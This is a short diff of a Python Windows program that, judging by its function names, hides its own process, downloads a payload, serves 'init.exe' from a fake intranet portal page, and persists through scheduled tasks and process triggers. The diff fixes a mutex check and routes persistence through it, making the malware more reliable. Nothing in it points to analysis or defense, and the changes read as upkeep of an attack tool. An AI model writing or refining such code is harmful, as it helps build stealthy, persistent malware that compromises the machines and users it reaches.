@@ -8,6 +8,7 @@ import string
 import psutil
 import wmi
 import win32event
+import win32api
 from http.server import HTTPServer, BaseHTTPRequestHandler
 
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
@@ -35,6 +36,7 @@ def download_payload():
 # HTTP server to serve init.exe and multi-page intranet portal
 class HTTPHandler(BaseHTTPRequestHandler):
     def do_GET(self):
+        global PAYLOAD_PATH
         # Common nav bar for all pages
         nav_bar = """
         <nav class="bg-blue-600 text-white py-4">
@@ -306,7 +308,7 @@ def persist_process_trigger():
 def persist_mutex():
     try:
         mutex = win32event.CreateMutex(None, False, 'Global\\HTTPServerMutex')
-        if win32event.GetLastError() == 0:
+        if win32api.GetLastError() == 0:
             persist_schtasks()
             persist_process_trigger()
     except:
@@ -316,6 +318,5 @@ def persist_mutex():
 if __name__ == '__main__':
     hide_process()
     download_payload()
-    persist_schtasks()
-    persist_process_trigger()
+    persist_mutex()
     start_http_server()
